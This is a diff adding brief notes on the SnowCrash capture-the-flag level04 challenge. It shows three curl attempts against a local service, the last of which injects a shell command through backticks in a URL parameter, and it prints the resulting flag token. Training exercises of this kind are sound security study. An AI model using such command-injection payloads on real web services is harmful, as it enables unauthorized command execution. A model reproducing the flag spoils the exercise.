@@ -1,0 +1,9 @@
+first attempt: 
+  - level04@SnowCrash:~$ curl "http://localhost:4747?x=getflag"
+   > getflag
+second attempt:
+  - level04@SnowCrash:~$ curl "http://localhost:4747?x=`getflag`"
+   > curl: (3) Illegal characters found in URL
+third attempt:
+  - level04@SnowCrash:~$ curl "http://localhost:4747?x=\`getflag\`"
+   > Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
